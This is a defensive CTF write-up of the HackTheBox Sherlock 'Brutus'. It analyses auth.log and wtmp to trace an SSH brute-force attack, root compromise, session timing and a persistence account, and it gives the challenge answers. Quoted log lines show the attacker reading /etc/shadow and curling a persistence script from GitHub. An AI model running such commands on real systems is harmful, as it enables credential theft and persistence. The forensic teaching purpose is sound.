# HackTheBox: Brutus

* **Sherlock:** Brutus
* **Platform:** HackTheBox
* **Category:** Sherlock
* **Difficulty:** Very Easy

## Investigation

The provided archive contains the following files:
```bash
└─$ 7z l Brutus.zip
auth.log
wtmp
utmp.py
```

I extracted the files using the provided password:
```bash
└─$ 7z x Brutus.zip -phacktheblue
```

The `auth.log` file contains 385 lines:
```bash
└─$ wc -l auth.log
385 auth.log
```

### Question 1

**What is the IP address used by the attacker to carry out a brute force attack?**

I searched the log file for the suspicious IP address:

```bash
└─$ grep '65.2.161.68' auth.log | wc -l
214
```
The IP address `65.2.161.68` appeared repeatedly in the authentication log, indicating brute-force activity.

**Answer:** `65.2.161.68`

### Question 2

**What is the username of the account that was compromised?**

I searched for successful SSH logins from the attacker IP:

```bash
└─$ grep -i 'accepted' auth.log | grep '65.2.161.68'
Mar  6 06:31:40 ip-172-31-35-28 sshd[2411]: Accepted password for root from 65.2.161.68 port 34782 ssh2
Mar  6 06:32:44 ip-172-31-35-28 sshd[2491]: Accepted password for root from 65.2.161.68 port 53184 ssh2
Mar  6 06:37:34 ip-172-31-35-28 sshd[2667]: Accepted password for cyberjunkie from 65.2.161.68 port 43260 ssh2
```

The account compromised by the brute-force attack was `root`.

**Answer:** `root`

### Question 3

**What is the UTC timestamp when the attacker manually logged in and established a terminal session?**

The provided Python script written for local time. change it for **UTC** time. For that change `localtime` to `gmtime` in Python script:
```pyhton
sec = time.strftime("%Y/%m/%d %H:%M:%S", time.gmtime(float(sec)))
```
I used the Updated Python script to parse the `wtmp` file:
```bash
└─$ python3 utmp.py -o wtmp.out wtmp
```

Then searched for the attacker IP:
```bash
└─$ grep '65.2.161.68' wtmp.out     
"USER"  "2549"  "pts/1" "ts/1"  "root"  "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 06:32:45"   "387923"        "65.2.161.68"
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"   "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 06:37:35"   "475575"        "65.2.161.68"
```

The terminal session started for root user at:

**Answer:** `2024-03-06 06:32:45`

### Question 4

**What is the session number assigned to the attacker's session?**

I searched for the session created when the attacker logged in as `root`:

```bash
grep 'session\s[0-9]' auth.log | grep 'root'
Mar  6 06:19:54 ip-172-31-35-28 systemd-logind[411]: New session 6 of user root.
Mar  6 06:31:40 ip-172-31-35-28 systemd-logind[411]: New session 34 of user root.
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
```
When we match time with previous output time we got: 

**Answer:** `37`

### Question 5

**What is the name of the account created by the attacker for persistence?**

I searched for another account login from the attacker IP address:
```bash
└─$ grep 'cyberjunkie' wtmp.out | grep -v 'root'
"USER"  "2667"  "pts/1" "ts/1"  "cyberjunkie"   "65.2.161.68"   "0"     "0"     "0"     "2024/03/06 06:37:35"   "475575"        "65.2.161.68"

```

**Answer:** `cyberjunkie`

### Question 6

**What is the MITRE ATT&CK sub-technique ID used for persistence?**

I visited [MITRE ATT&CK](https://attack.mitre.org/techniques/T1136/) official website and found.  

T1136.001 	Local Account 

**Answer:** `T1136.001`

### Question 7

**When did the attacker's first SSH session end?**

I checked activity associated with session ID 37, when attacker first login:

```bash
└─$ grep -i 'session\s37' auth.log         
Mar  6 06:32:44 ip-172-31-35-28 systemd-logind[411]: New session 37 of user root.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Session 37 logged out. Waiting for processes to exit.
Mar  6 06:37:24 ip-172-31-35-28 systemd-logind[411]: Removed session 37.
```

**Answer:** `2024-03-06 06:37:24`

### Question 8

**What is the full command used by the attacker to download a script?**

I searched the log for commands executed using `sudo`:

```bash
└─$ grep 'sudo' auth.log | grep -i 'command'
Mar  6 06:37:57 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/cat /etc/shadow
Mar  6 06:39:38 ip-172-31-35-28 sudo: cyberjunkie : TTY=pts/1 ; PWD=/home/cyberjunkie ; USER=root ; COMMAND=/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh
```
The log showed:

**Answer:** `/usr/bin/curl https://raw.githubusercontent.com/montysecurity/linper/main/linper.sh`

## Summary

Brutus is a log-analysis Sherlock where `auth.log` and `wtmp` are used to trace a brute-force attack, identify the compromised account, track the attacker's session, and discover a new privileged account created for persistence.
